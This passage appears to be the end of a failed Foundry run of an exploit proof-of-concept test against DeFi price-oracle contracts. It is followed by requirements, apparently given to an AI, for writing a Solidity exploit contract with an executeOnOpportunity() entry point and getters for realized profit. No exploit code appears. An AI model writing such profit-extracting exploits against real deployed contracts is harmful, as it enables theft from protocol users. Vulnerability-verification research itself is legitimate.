    │   ├─ [548] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632::defaultOracle() [staticcall]
    │   │   ├─ [382] 0xb3c8eE7309BE658c186F986388c2377da436D8fb::defaultOracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x1887118E49e0F4A78Bd71B792a49dE03504A764D
    │   │   └─ ← [Return] 0x1887118E49e0F4A78Bd71B792a49dE03504A764D
    │   ├─ [171] 0x1887118E49e0F4A78Bd71B792a49dE03504A764D::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [466] 0x1887118E49e0F4A78Bd71B792a49dE03504A764D::oracles(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   └─ ← [Return] 0xb0602af43Ca042550ca9DA3c33bA3aC375d20Df4
    │   ├─ [215] 0xb0602af43Ca042550ca9DA3c33bA3aC375d20Df4::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [215] 0xb0602af43Ca042550ca9DA3c33bA3aC375d20Df4::oracles(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [215] 0xb0602af43Ca042550ca9DA3c33bA3aC375d20Df4::defaultOracle() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [171] 0x1887118E49e0F4A78Bd71B792a49dE03504A764D::defaultOracle() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [383] 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [staticcall]
    │   │   ├─ [215] 0xb3c8eE7309BE658c186F986388c2377da436D8fb::assetPrices(0x865377367054516e17014CcdED1e7d814EDC9ce4) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   └─ ← [Revert] no-candidate
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf
  at 0x058c345D3240001088b6280e008F9e78b3B2112d.getUnderlyingPrice
  at 0xb3c8eE7309BE658c186F986388c2377da436D8fb.getUnderlyingPrice
  at 0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632.getUnderlyingPrice
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 114.95ms (66.70ms CPU time)

Ran 1 test suite in 152.63ms (114.95ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 4074437)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
